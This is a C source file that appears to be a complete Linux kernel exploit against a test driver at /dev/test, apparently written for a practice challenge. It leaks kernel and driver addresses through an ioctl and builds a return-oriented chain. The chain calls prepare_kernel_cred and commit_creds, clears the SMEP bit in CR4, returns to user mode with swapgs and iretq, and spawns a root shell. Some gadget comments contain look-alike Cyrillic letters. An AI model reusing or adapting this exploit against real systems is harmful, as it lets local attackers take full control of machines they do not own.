#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
size_t page_size;
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm (
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :);
}


void get_shell(int sig)
{
    system("/bin/sh");
    exit(EXIT_SUCCESS) ;
}


int main(){
    int fd, result, i;
    char buf [0x200];
    char *driver_addr, *kernel_base_addr;
    size_t offset;
    size_t *rop;


    fd = open("/dev/test", O_RDONLY) ;
    if(fd == -1)
    {
        perror("open");
        exit(EXIT_FAILURE); 
    }


    memset(buf, 0, sizeof(buf));
    result = ioctl(fd, 0xff00, buf);

    driver_addr = *(char **)(buf + 0) - 0x7c;
    kernel_base_addr = *(char **)(buf + 0x48) - 0x4b80ea ;
    printf("driver_addr: %p\n", driver_addr) ;
    printf("kernel_base_addr: %p\n", kernel_base_addr) ;
    
    /* Get real address */
    #define REAL_D(addr) (size_t)(driver_addr - 0 + (addr)) // for driver
    #define REAL_K(addr) (size_t)(kernel_base_addr - 0xffffffff81000000 + (addr)) // for kernel
    rop = (size_t*)buf;
    i = 0;

    save_status() ;

    rop[i++] = REAL_D(0x0000000000000069);   // pop rdi; ret;
    rop[i++] = 0;                            // root  -> 0
    rop[i++] = REAL_K(0xffffffff810cde90);   // prepare kernel cred
    rop[i++] = REAL_D(0x000000000000006b);   // mоv rdі, rах; rеt;
    rop[i++] = REAL_K(0xffffffff810cdb10);   // commit creds
    
    rop[i++] = REAL_D(0x0000000000000069);  // рор rdі; rеt;
    rop[i++] = 0x6f0;                       // root -> 0
    rop[i++] = REAL_D(0x000000000000006f);  // mov cr4, rdi; ret;
    rop[i++] = REAL_D(0x0000000000000073);  // swapgs; ret;

    rop[i++] = REAL_D(0x0000000000000077);  // iretq; ret;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;     /* saved CS */ 
    rop[i++] = user_rflags; /* saved EFLAGS */
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    signal(SIGSEGV, get_shell) ;
    ioctl(fd, 0xff01, buf) ;
}
